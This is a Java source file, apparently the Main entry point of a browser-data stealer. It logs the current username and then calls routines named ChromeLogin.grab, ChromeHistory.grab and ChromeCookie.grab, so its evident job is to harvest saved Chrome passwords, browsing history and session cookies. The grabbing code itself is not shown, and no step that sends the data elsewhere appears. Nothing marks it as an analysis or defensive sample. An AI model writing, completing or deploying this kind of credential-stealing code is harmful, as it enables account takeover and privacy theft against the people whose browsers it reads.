package ninja.maki;

import ninja.maki.grabber.chrome.ChromeCookie;
import ninja.maki.grabber.chrome.ChromeHistory;
import ninja.maki.grabber.chrome.ChromeLogin;
import ninja.maki.utils.SystemUtil;

public class Main {
    public static void main(String[] args){
        SystemUtil.console("Starting program.");
        SystemUtil.console();
        SystemUtil.console("Current User -> " + System.getenv("USERNAME"));
        ChromeLogin.grab();
        ChromeHistory.grab();
        ChromeCookie.grab();
        SystemUtil.console();
        SystemUtil.console("Stop program.");
    }
}
